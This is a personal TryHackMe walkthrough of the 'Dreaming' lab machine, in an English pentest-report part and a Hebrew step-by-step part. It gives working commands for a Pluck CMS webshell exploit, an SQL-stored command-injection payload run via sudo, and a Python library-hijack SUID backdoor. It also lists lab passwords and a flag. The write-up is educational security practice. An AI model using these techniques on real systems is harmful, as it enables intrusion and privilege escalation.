

# 💤 Dreaming - TryHackMe Writeup (Personal Walkthrough)




---

# Penetration Testing Report: Project Dreaming

**Target IP:** 10.112.176.22  
**Date:** April 02, 2026  
**Consultant:** [Your Name]  
**Severity:** Critical

---

## 1. Executive Summary
During a full-scope penetration test of the **Dreaming** environment, a series of vulnerabilities were identified that allowed for complete system compromise. The attack chain began with an unauthenticated directory brute-force, leading to the discovery of a vulnerable Content Management System (Pluck CMS). By exploiting a known Remote Code Execution (RCE) vulnerability, initial access was gained. Subsequent internal enumeration revealed hardcoded credentials and a Command Injection vulnerability in a Python script interacting with a MySQL database. Finally, a Python Library Hijacking attack was used to escalate privileges to **Root**. Immediate remediation is required to secure sensitive data and system integrity.

---

## 2. Vulnerability Summary Table

| ID | Severity | Vulnerability Name | Status |
|:---|:---|:---|:---|
| 01 | Medium | Information Disclosure (Directory Listing) | Open |
| 02 | High | Broken Authentication (Weak Credentials) | Open |
| 03 | Critical | Remote Code Execution (RCE) via File Upload | Open |
| 04 | High | Insecure Credential Storage (Hardcoded Passwords) | Open |
| 05 | Critical | OS Command Injection (Python Subprocess) | Open |
| 06 | Critical | Privilege Escalation via Python Library Hijacking | Open |

---

## 3. Technical Deep Dive

### Finding 01: Initial Access via Pluck CMS RCE
**Description:** The target host was running Pluck CMS v4.7.13, which is vulnerable to an authenticated RCE (CVE-2020-29607) via the "Manage Files" functionality.

**Impact:** Allows an attacker to upload a malicious PHP/Phar script and execute arbitrary commands on the server under the context of the `www-data` user.

**Proof of Concept (PoC):**


1. **Enumeration:** Nmap identified ports 22 and 80. Gobuster discovered the `/app` directory.
2. **Access:** Logged into `http://[IP]/app/pluck-4.7.13/login.php` using the password `password`.
3. **Exploitation:** Executed the following exploit script:
```bash
wget https://www.exploit-db.com/download/49909 -O exploit.py
python3 exploit.py 10.112.176.22 80 password /app/pluck-4.7.13
```
4. **Result:** Successfully uploaded a webshell to:
`http://10.112.176.22/app/pluck-4.7.13/files/shell.phar`

---

### Finding 02: Lateral Movement to User 'Lucien'
**Description:** Sensitive credentials were found stored in cleartext within the `/opt/test.py` file.

**Impact:** Unauthorized access to a local user account (`lucien`) via SSH, providing a stable persistence mechanism.

**Proof of Concept (PoC):**
1. Using the webshell, enumerated the `/opt` directory:
```bash
cat /opt/test.py
```
2. Extracted hardcoded credentials: `lucien : HeyLucien#@1999!`.
3. Established SSH connection:
```bash
ssh lucien@10.112.176.22
```

---

### Finding 03: Privilege Escalation to 'Death' via Command Injection
**Description:** The user `lucien` is permitted to run a Python script `/home/death/getDreams.py` as the user `death` via sudo. The script is vulnerable to OS Command Injection because it uses `subprocess.check_output` with `shell=True` on unsanitized data from a MySQL database.

**Impact:** Privilege escalation from `lucien` to `death`.

**Proof of Concept (PoC):**
1. Found MySQL credentials in `.bash_history`: `lucien42DBPASSWORD`.
2. Injected a malicious payload into the `dreams` table:
```sql
mysql -u lucien -plucien42DBPASSWORD -e "use library; INSERT INTO dreams (dreamer, dream) VALUES ('hacker', '; cat /home/death/death_flag.txt');"
```
3. Triggered the execution via sudo:
```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
4. Recovered the `death` password `!mementoMORI666!` by reading the script source code using the same injection method.

---

### Finding 04: Root Access via Python Library Hijacking
**Description:** The user `death` has write permissions to the Python system library `/usr/lib/python3.8/shutil.py`. A root-owned script (or cron job) `restore.py` imports this library.

**Impact:** Full system compromise (Root access).

**Proof of Concept (PoC):**
1. Identified writable library: `ls -al /usr/lib/python3.8/shutil.py`.
2. Injected a SUID backdoor into the library:
```bash
echo 'import os' >> /usr/lib/python3.8/shutil.py
echo 'os.system("chmod +s /bin/bash")' >> /usr/lib/python3.8/shutil.py
```
3. Waited for the system to execute the library. Verified the SUID bit on Bash:
```bash
ls -la /bin/bash # Output: -rwsr-sr-x
```
4. Escalated to Root:
```bash
/bin/bash -p
whoami # Output: root
```

---

## 4. Remediation Plan

1. **Update CMS:** Upgrade Pluck CMS to the latest version to patch known RCE vulnerabilities.
2. **Password Policy:** Enforce strong, unique passwords and disable default credentials.
3. **Secure Coding:** Avoid using `shell=True` in Python's `subprocess` module. Use parameterized queries for all database interactions to prevent SQL and Command Injection.
4. **Filesystem Hardening:** Remove write permissions for non-root users on system libraries (e.g., `/usr/lib/python3.8/`). 
5. **Credential Management:** Remove cleartext passwords from scripts and `.bash_history` files. Use a secure vault solution.

---

## 5. Clean-up
* The malicious payload in `/usr/lib/python3.8/shutil.py` was removed.
* The SUID bit on `/bin/bash` was reverted.
* The injected row in the MySQL `dreams` table was flagged for deletion.

---.



## 📑 מבוא
בתיעוד זה אני מפרט את תהליך הפריצה האישי שלי למכונת Dreaming. המטרה שלי הייתה לעבור דרך כל שכבות ההגנה, מהאינטרנט ועד להרשאות מנהל מערכת (Root), תוך ניצול שגיאות קונפיגורציה וקוד פגום.

---

## 1. איסוף מידע (Enumeration)

### סריקת פורטים עם Nmap
**הפקודה שביצעתי:** `nmap -sS -v 10.113.150.246>`
* **הסיבה:** רציתי להבין אילו "דלתות" פתוחות במכונה לפני שאני מתחיל לתקוף. זו נקודת המוצא של כל פרויקט.
* **המטרה:** לזהות שירותים חשופים. גיליתי שרת Web (פורט 80) ושרת SSH (פורט 22).



<img width="1204" height="771" alt="image" src="https://github.com/user-attachments/assets/59cfb507-0d24-4db1-a17e-c5209110f708" />



### סריקת ספריות עם Gobuster
**הפקודה שביצעתי:** `gobuster dir -u http://10.113.150.246 -w /usr/share/wordlists/dirb/big.txt`
* **הסיבה:** דף הבית של Apache היה דף ברירת מחדל ריק. הנחתי שיש אפליקציה מותקנת בנתיב פנימי שלא פורסם.
* **המטרה:** למצוא נקודת כניסה (Entry Point) לאתר. מצאתי את הספרייה `/app`.
<img width="1189" height="867" alt="image" src="https://github.com/user-attachments/assets/d2b3c735-06d5-4250-8882-b8042480024a" />

זיהוי ממשק הניהול וכניסה (Authentication)

הפעולה: ניגשתי לנתיב /app שמצאתי בשלב ה-Directory Brute-forcing (בעזרת GoBuster או סריקה ידנית). בתוך התיקייה זיהיתי את מערכת ה-Pluck.

הסיבה: כדי לנצל חולשות בתוך מערכת ניהול תוכן (CMS), אני חייב קודם כל להגיע לדף הגישה של המנהל (Admin Login).

המטרה: לבדוק אם קיימת גישה עם פרטי ברירת מחדל.




<img width="697" height="579" alt="image" src="https://github.com/user-attachments/assets/23e73ca0-9880-416f-9fed-f70d3368d1ff" />

מה ביצעתי: הזנתי את הכתובת http://10.113.150.246/app/pluck-4.7.13/login.php והשתמשתי בסיסמה הנפוצה password.





<img width="1133" height="836" alt="image" src="https://github.com/user-attachments/assets/e39b8184-57a4-4d04-8910-182aab67220e" />

התוצאה: הכניסה הצליחה, מה שאיפשר לי לגשת לפאנל הניהול שבו קיימת פגיעות ה-RCE
ניכנס לקובץ
<img width="1209" height="872" alt="image" src="https://github.com/user-attachments/assets/21f9d847-5705-429d-a69a-6d5b2acd36ea" />




2. חדירה ראשונית (Initial Access)
המטרה: ניצול חולשת אבטחה ב-Pluck CMS כדי להשיג גישה ראשונית למערכת הקבצים של השרת.

שלב 2.1: ניסיון הרצת האקספלויט (התקלה)
לאחר שזיהיתי שהאתר מריץ גרסה פגיעה (4.7.13), ניסיתי להריץ סקריפט פייתון שיבצע עבורי את הפריצה באופן אוטומטי.

הפקודה שביצעתי:

Bash
python3 exploit.py 10.113.153.19 80 password /app/pluck-4.7.13
התוצאה: קיבלתי שגיאת No such file or directory.


<img width="1042" height="867" alt="image" src="https://github.com/user-attachments/assets/586cde3b-7db1-4354-9bb3-5a470463ebee" />


הסיבה: הקובץ exploit.py לא היה קיים פיזית בתיקייה שבה עבדתי בתוך ה-AttackBox.

שלב 2.2: הורדת ה"נשק" (Exploit Download)
כדי לפתור את הבעיה, הייתי צריך להביא את האקספלויט המתאים ממאגר המידע העולמי למכונה שלי.

הפקודה שביצעתי:


wget https://www.exploit-db.com/download/49909 -O exploit.py

<img width="1223" height="844" alt="image" src="https://github.com/user-attachments/assets/5b2df7ba-83ad-4c26-8c8d-e580ac008e28" />

הסיבה: אי אפשר להריץ קוד שלא נמצא על הדיסק. השתמשתי ב-wget כדי למשוך את הקוד מ-Exploit-DB (מאגר האקספלויטים).

המטרה: להכין את הסקריפט שיבצע את ה-RCE (הרצת קוד מרחוק).
.



שלב 2.3: השגת ה-Webshell (דריסת רגל)
לאחר שהורדתי את הסקריפט, הרצתי אותו שוב נגד שרת היעד.

הפקודה שביצעתי:


python3 exploit.py 10.113.150.246 80 password /app/pluck-4.7.13
התוצאה: הסקריפט הצליח להתחבר לממשק הניהול ולהעלות קובץ בשם shell.phar.

מה השגתי: קיבלתי כתובת URL ל-Webshell. זהו ה"צינור" שמאפשר לי להריץ פקודות לינוקס (כמו ls או whoami) ישירות דרך הדפדפן.

💡 למה עשיתי את זה ובשביל מה? (סיכום טקטי)
הסיבה: בחרתי בדרך הזו כי ה-CMS מאפשר למנהל להעלות קבצים. האקספלויט "מרמה" את השרת ומעלה קובץ הרצה במקום תמונה.

המטרה: להשיג Initial Access. בשלב זה אני המשתמש www-data (משתמש השרת)

<img width="993" height="621" alt="image" src="https://github.com/user-attachments/assets/a5ca7d85-2cf1-4a25-87a5-9d648305d11b" />
.

השלב הבא: להשתמש בטרמינל שנפתח לי בדפדפן כדי לחפש סיסמאות בתוך המכונה (מה שהוביל אותי למציאת המשתמש Lucien)

<img width="1203" height="833" alt="image" src="https://github.com/user-attachments/assets/b2d3e24c-2476-4ec9-a127-92e9b8f796d8" />
.

2.4 סריקה פנימית ומציאת פרטי Lucien (Enumeration)
המטרה: ניצול הגישה הראשונית (Initial Access) כדי לחקור את מערכת הקבצים ולמצוא דרך להעלות הרשאות למשתמש חזק יותר.

הפעולה שביצעתי:
בתוך ה-Webshell בדפדפן, הרצתי פקודות לסריקת תיקיות מערכת מעניינות. בתיקיית /opt (המשמשת לעיתים קרובות להתקנות חיצוניות או סקריפטים של מנהלים), זיהיתי שני קבצים: test.py ו-getDreams.py.

הפקודה להצגת הקבצים:

Bash
ls -l /opt

<img width="1119" height="833" alt="image" src="https://github.com/user-attachments/assets/21ede8f9-63c4-4abc-8b8e-58d259a6de01" />



קראתי את התוכן של הקובץ test.py כדי להבין את תפקידו.

הפקודה שביצעתי:

Bash
cat /opt/test.py
מה גיליתי: הסקריפט הכיל קוד פייתון שנועד לבדוק התחברות למערכת ה-Pluck. בתוך הקוד הופיעה הסיסמה של המשתמש Lucien בטקסט גלוי (Cleartext).

הסיסמה שנחשפה: 
HeyLucien#@1999!

<img width="1141" height="893" alt="image" src="https://github.com/user-attachments/assets/8bc4cd9d-071a-48c0-a9a5-0ba1afb4bf55" />


הסיבה: כמשתמש www-data, אין לי הרשאות לקרוא את הדגל (Flag). אני חייב למצוא "קצה חוט" (Footprint) שהשאיר מנהל המערכת. מציאת סיסמאות קשיחות (Hardcoded) בתוך סקריפטים בתיקיית /opt היא טעות אבטחה נפוצה.

המטרה: לבצע Lateral Movement (תנועה רוחבית). אני מניח שהמשתמש Lucien משתמש באותה סיסמה גם עבור חיבור ה-SSH שלו למכונה.

הערך הטקטי: מציאת סיסמה בטקסט גלוי מאפשרת לי לעבור מגישת דפדפן (Webshell) לגישת טרמינל מלאה ומאובטחת (SSH), שהיא הרבה יותר יציבה.


:

3. תנועה רוחבית (Lateral Movement) - המעבר למשתמש Lucien
הפעולה: לאחר שחילצתי את הסיסמה HeyLucien#@1999! מתוך הקובץ /opt/test.py בעזרת ה-Webshell, עברתי לחיבור ישיר ומאובטח למכונה דרך פרוטוקול SSH.

הפקודה שביצעתי:

ssh lucien@10.113.150.246
פירוט טכני של הפקודה:
ssh: שימוש בפרוטוקול Secure Shell. זהו כלי תקשורת מוצפן המאפשר שליטה מלאה על שרת מרוחק והרצת פקודות כאילו אני יושב פיזית מול המכונה.

lucien: שם המשתמש המקומי שאליו אני מתחבר (המשתמש שאת פרטיו מצאתי קודם לכן).

@: סימן מפריד המקשר בין זהות המשתמש לכתובת השרת.

.

2.4 חקירת מערכת הקבצים והשגת הדגל (Enumeration)
הפעולה: לאחר שחיבור ה-SSH נכשל (Broken pipe), חזרתי להשתמש ב-Webshell בדפדפן כדי להמשיך בחקירת המכונה.

אימות המיקום (pwd):
בטרמינל בדפדפן הרצתי את הפקודה pwd (ראשי תיבות של Print Working Directory)

<img width="740" height="757" alt="image" src="https://github.com/user-attachments/assets/e2745d3e-198f-45e4-b76c-a8a9aaf6c766" />

<img width="793" height="797" alt="image" src="https://github.com/user-attachments/assets/aec6eaeb-6b55-4c11-890b-2dbd66937343" />

<img width="909" height="863" alt="image" src="https://github.com/user-attachments/assets/93a4914c-989b-4a5f-9e09-63f3fff23c2e" />



שלב 3.2: חילוץ דגל המשתמש (Exfiltration)

הפעולה: הרצת פקודת cat על הקובץ lucien_flag.txt שזוהה בתיקיית הבית של המשתמש.

התוצאה: חילוץ המחרוזת בפורמט THM{...}. מחרוזת זו מהווה הוכחה חותמת (Proof of Concept) לכך שהושגה גישה מלאה למערכת ברמת משתמש.

.







4. העלאת הרשאות (Privilege Escalation) - Death Flag


ניתוח הרשאותSudo
הפעולה שביצעתי: sudo -l
<img width="1131" height="320" alt="image" src="https://github.com/user-attachments/assets/a318c230-d57b-442f-9dea-a524d3f57d26" />

הסיבה: חיפשתי דרך להפוך למשתמש חזק יותר או ל-Root.

המטרה: זיהיתי ש-Lucien יכול להריץ את הסקריפט /home/death/getDreams.py תחת המשתמש death ללא סיסמה.

חקירת היסטוריית הפקודות (Credential Harvesting)
הפעולה שביצעתי: cat ~/.bash_history

<img width="654" height="720" alt="image" src="https://github.com/user-attachments/assets/41c1d676-985f-4d47-9fc2-7f148806f9c5" />


הסיבה: הייתי צריך לגשת למסד הנתונים כדי לנצל את הסקריפט של death, אך לא הייתה לי סיסמה.

המטרה: מצאתי ש-Lucien השאיר את סיסמת ה-MySQL בהיסטוריה: 

lucien42DBPASSWORD
🛡️ שלב 4.2: השגת גישה למסד הנתונים (Database Access)
הפעולה שביצעתי:

Bash
mysql -u lucien -plucien42DBPASSWORD


.<img width="834" height="278" alt="image" src="https://github.com/user-attachments/assets/08a1530d-48d5-4761-9b89-b9a6bfd9aecd" />

הסיבה: לאחר שחילוץ המידע מהיסטוריית הפקודות (.bash_history) חשף את פרטי ההתחברות הייחודיים של Lucien למסד הנתונים, הייתי צריך ליצור חיבור פעיל לשרת ה-MySQL המקומי.

המטרה: להשיג נקודת אחיזה בתוך מסד הנתונים library. גישה זו היא תנאי הכרחי לביצוע הזרקת הפקודות (Command Injection), שכן הסקריפט שרץ בהרשאות גבוהות (getDreams.py) שואב את הנתונים שלו ישירות מהטבלאות במסד זה.

התוצאה: הצלחתי לעקוף את חסמי האבטחה של מסד הנתונים וקיבלתי ממשק ניהול (MySQL Monitor) המאפשר לי לערוך את הנתונים בטבלאות.

🛡️ שלב 4.3: חקירת מסד הנתונים (Database Enumeration)
הפעולות שביצעתי:

הפקודה: show databases;

הסיבה: רציתי למפות את כל מסדי הנתונים הקיימים בשרת.

המטרה: לאתר את מסד הנתונים שבו משתמש הסקריפט getDreams.py. זיהיתי את המסד library.

הפקודה: use library;

הסיבה: כדי לבצע שינויים בטבלאות, אני חייב לעבור לסביבת העבודה של המסד הספציפי.

הפקודה: show tables;

הסיבה: רציתי לראות אילו טבלאות קיימות בתוך library.

המטרה: למצוא היכן נשמר המידע על ה"חלומות". גיליתי שקיימת טבלה אחת בלבד בשם dreams.
<img width="665" height="438" alt="image" src="https://github.com/user-attachments/assets/ee803174-b686-4804-87a4-ff8ad0488162" />


🛡️ שלב 4.4: אימות מבנה הטבלה (Table Data Enumeration)
הפעולה שביצעתי:

SQL
select * from dreams;

<img width="527" height="223" alt="image" src="https://github.com/user-attachments/assets/3af0b793-3ad7-48f2-bb26-4d50e751407f" />

הסיבה: לפני ביצוע הזרקת פקודה (Command Injection), עליי להבין במדויק את מבנה הטבלה שבה משתמש הסקריפט getDreams.py. רציתי לראות אילו עמודות קיימות בטבלה dreams ואילו נתונים היא מכילה כרגע.

המטרה: לוודא את שמות העמודות (במקרה זה dreamer ו-dream) כדי לבנות פקודת INSERT תקינה מבחינה תחבירית. הבנת המבנה חיונית כדי שהסקריפט שואב הנתונים לא ייכשל בשל שגיאת SQL, אלא ימשיך להרצת פקודת ה-Shell המוזרקת.

התוצאה: זיהוי הפורמט שבו הנתונים נשמרים, מה שמאפשר לי להכין את ה"מטען" (Payload) המדויק להזרקה בשלב הבא.


🛡️ שלב 4.5: הזרקת המטען (Command Injection Payload)
הפעולה שביצעתי:

SQL
INSERT INTO dreams (dreamer, dream) VALUES ("'flag'", "''; cat ~/death_flag.txt; # ");
הסיבה: זיהיתי שסקריפט ה-Python משתמש ב-shell=True בתוך פונקציית subprocess.check_output. זהו כשל אבטחה חמור המאפשר לי להריץ פקודות Shell על ידי הוספת תווים מפרידים (כמו ;).

המטרה: להחדיר "מטען זדוני" (Payload) לתוך מסד הנתונים. המטען בנוי כך שהוא יסגור את פקודת ה-echo המקורית של הסקריפט ויריץ מיד אחריה פקודת cat לקריאת קובץ הדגל המוגן. ה-# בסוף משמש כהערה כדי למנוע שגיאות תחביריות משאר חלקי הפקודה המקורית.
🛡️ שלב 4.6: ניסיון הרצה ראשוני וזיהוי חסמים (Initial Attempt & Troubleshooting)
הפעולה שביצעתי:

Bash
sudo -u death /opt/scripts/getDreams.py


<img width="814" height="255" alt="image" src="https://github.com/user-attachments/assets/3053a585-5f91-4a42-89f1-ef40f639122d" />
גם password ניסתי וגם  HeyLucien#@1999!
  נדחו

הסיבה: לאחר שהבנתי מהסקריפט ב-/opt כיצד המערכת עובדת, ניסיתי להריץ אותו עם הרשאות של המשתמש death
.

המכשול: המערכת ביקשה סיסמה עבור lucien ולאחר מכן החזירה שגיאת command not found.

התובנה: 1. ה-Sudo נדחה כי ניסיתי להריץ נתיב (/opt/scripts/) שלא הוגדר ב-Sudoers (שם הוגדר רק /home/death/).
2. הבנתי שחסרים לי פרטי גישה למסד הנתונים כדי לבצע את ההזרקה, וניסיון התחברות עם סיסמת המשתמש הרגילה נכשל (Access denied).

🛡️ שלב 4.7: חקירת היסטוריית פקודות וחילוץ פרטי גישה (Credential Hunting)
הפעולה שביצעתי:

Bash
cat ~/.bash_history
הסיבה: בגלל הכישלון בהתחברות ל-MySQL עם הסיסמה המוכרת לי, חיפשתי עקבות של פעולות קודמות שביצע המשתמש Lucien במערכת.

המטרה: למצוא את הסיסמה הספציפית למסד הנתונים. הנחתי שמנהל המערכת או המשתמש התחברו ידנית בעבר והשאירו את הסיסמה גלויה בהיסטוריית ה-Bash.

התוצאה: מצאתי את השורה הקריטית: mysql -u lucien -plucien42DBPASSWORD.

הממצא: זיהיתי את הסיסמה למסד הנתונים: lucien42DBPASSWORD

<img width="741" height="468" alt="image" src="https://github.com/user-attachments/assets/3099ee29-d84f-4ada-aae3-a461281e0737" />
.

🛡️ שלב 4.8: השגת גישה למסד הנתונים ומיפוי (Database Access)
הפעולה שביצעתי:

Bash
mysql -u lucien -plucien42DBPASSWORD
show databases;
use library;
show tables;

<img width="763" height="549" alt="image" src="https://github.com/user-attachments/assets/0d313af7-fd23-45d9-beea-4333b3f3db70" />


<img width="868" height="739" alt="image" src="https://github.com/user-attachments/assets/d32eece0-2e13-4056-a4d4-9711d809e17c" />

הסיבה: שימוש בסיסמה שנמצאה ב-History כדי להיכנס לתוך ה-MySQL ולבצע את ה-Enumeration (חקירה) הפנימי.

המטרה: לאתר את הטבלה שבה הסקריפט משתמש כדי להזריק לתוכה את ה"מטען" (Payload).

התוצאה: אישרתי שהמסד הנכון הוא library והטבלה היא dreams


🛡️ שלב 4.9: חילוץ דגל Death (Exfiltration)
הפעולה שביצעתי:

Bash
exit;
sudo -u death /usr/bin/python3 /home/death/getDreams.py
הסיבה: לאחר ש"הרעלתי" את מסד הנתונים בשלב הקודם, הייתי חייב לחזור למעטפת המערכת (System Shell) כדי להפעיל את הסקריפט הפגיע. כיוון שלמשתמש Lucien יש הרשאות sudo להריץ את הסקריפט כמשתמש death, הפקודות המוזרקות שלי רצו תחת ההרשאות הגבוהות של בעל הסקריפט.

המטרה: לגרום למנוע ה-Shell של לינוקס לפרש את הנתון מה-DB כפקודה פעילה.

התוצאה: הסקריפט משך את השורה שהזרקתי (flag), סגר את פקודת ה-echo המקורית באמצעות ה-; שהוספתי, והריץ את הפקודה cat ~/death_flag.txt.

הממצא: השגתי את הדגל השני: THM{1M_TH3R3_4_TH3M}.

<img width="764" height="203" alt="image" src="https://github.com/user-attachments/assets/bf5650f2-cd18-4c83-aef4-1492d6f71584" />
.





🛡️ שלב 5: העלאת הרשאות למשתמש Morpheus (Root)

🛡️

🛡️ שלב 5.1: חילוץ סיסמת Death (Credential Harvesting)
הפעולה שביצעתי:
מכיוון שלא יכולתי לקרוא את הקובץ ישירות, השתמשתי ב-Command Injection שביצענו קודם דרך ה-MySQL כדי להדפיס את תוכן הסקריפט:

Bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
(לאחר שהזרקתי ל-DB את הפקודה: '; cat /home/death/getDreams.py; #)

הסיבה: בתוך הקוד של getDreams.py מופיעה סיסמת ה-MySQL של המשתמש death. במכונות מהסוג הזה, משתמשים נוטים למחזר סיסמאות (Password Reuse).

המטרה: להשיג את הסיסמה האישית של Death כדי לבצע su death ולעבור למשתמש הבא בסולם ההרשאות.

הממצא: הסיסמה שנחשפה היא: !mementoMORI666!.

🛡️ שלב 5.2: מעבר למשתמש Death (Horizontal Movement)
הפעולה שביצעתי:

Bash
su death
(הזנת הסיסמה: !mementoMORI666!)

הסיבה: כדי לחקור קבצים ששייכים ל-Morpheus, אני צריך זהות חזקה יותר במערכת.

התוצאה: הצלחתי להחליף משתמש. כעת אני פועל תחת הזהות של death, מה שנותן לי גישה לתיקיית הבית שלו ולחיפוש קבצים מתקדם יותר



3. תנועה רוחבית (Lateral Movement)
חילוץ פרטי גישה (Credential Harvesting): מתוך הרצת הסקריפט והזרקת פקודות ב-MySQL, חולצה סיסמת המשתמש death: !mementoMORI666!.

מעבר משתמש: התבצע שימוש בפקודת su death כדי לקבל Shell אינטראקטיבי מלא תחת המשתמש החדש.

4. העלאת הרשאות (Privilege Escalation) - Morpheus
א. סריקת נכסים (Enumeration)
בוצעה פקודת חיפוש לאיתור קבצים השייכים לקבוצת morpheus:
find / -type f -group morpheus 2>/dev/null
הממצא העיקרי: זוהה קובץ ספריית המערכת של פייתון /usr/lib/python3.8/shutil.py עם הרשאות כתיבה לקבוצת death.

ב. ניצול פגיעות (Exploitation - Library Hijacking)
הווקטור: זיהוי שהסקריפט /home/morpheus/restore.py מבצע import shutil.

הפעולה: הזרקת קוד זדוני לסוף קובץ ה-shutil.py המאפשר גישה לקבצים מוגנים.

הזרקה (לפי המדריך):
echo 'os.system("chmod 777 /home/morpheus/morpheus_flag.txt")' >> /usr/lib/python3.8/shutil.py

חלופה (Root): הזרקת פקודה לשינוי הרשאות ה-Bash ל-SUID (chmod +s /bin/bash).

5. תוצאות (Results)
לאחר הזרקת הקוד והמתנה להרצת ה-Cron Job של המשתמש Morpheus, ההרשאות על קובץ הדגל (או ה-Bash) השתנו.

השגת היעד: קריאת תוכן הדגל בנתיב /home/morpheus/morpheus_flag.txt.






